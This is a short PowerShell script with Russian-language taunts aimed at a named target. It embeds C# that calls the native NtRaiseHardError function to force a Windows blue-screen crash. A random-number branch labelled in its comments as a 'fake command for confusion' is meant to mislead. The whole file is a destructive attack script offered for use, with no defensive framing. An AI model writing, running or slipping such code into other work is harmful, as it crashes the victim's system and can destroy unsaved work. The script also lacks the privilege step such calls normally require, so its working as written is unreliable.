# ССН, это твой конец! ТССН активирован! 😈

# Функция для вызова BSOD через NtRaiseHardError
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class BSOD {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);

    public static void CauseBSOD() {
        uint response;
        NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
    }
}
"@

# Вызываем BSOD
[BSOD]::CauseBSOD()

# Фейковая команда для запутывания
$fakeVar = Get-Random -Minimum 1 -Maximum 100
if ($fakeVar -gt 50) {
    Write-Output "Фейковая команда выполнена, ССН, не ведись!"
}